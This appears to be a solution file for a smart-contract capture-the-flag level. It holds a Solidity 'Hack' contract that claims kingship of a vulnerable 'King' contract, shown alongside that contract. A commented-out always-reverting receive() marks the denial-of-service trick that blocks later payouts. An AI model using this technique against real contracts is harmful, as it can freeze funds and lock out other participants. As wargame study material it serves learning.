pragma solidity ^0.8;

interface IKing {
    function prize() external view returns (uint256);
    function _king() external view returns (address);
}

contract Hack {
    constructor(address payable _target) payable {
        uint256 prize = IKing(_target).prize();
        // call King.receive()
        // use call and forward all gas
        (bool ok,) = _target.call{value: prize}("");
        require(ok, "tx failed");
    }

    // receive() external payable {
    //     require(false, "always fail");
    // }
}


//======

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {

  address king;
  uint public prize;
  address public owner;

  constructor() payable {
    owner = msg.sender;  
    king = msg.sender;
    prize = msg.value;
  }

  receive() external payable {
    require(msg.value >= prize || msg.sender == owner);
    payable(king).transfer(msg.value);
    king = msg.sender;
    prize = msg.value;
  }

  function _king() public view returns (address) {
    return king;
  }
}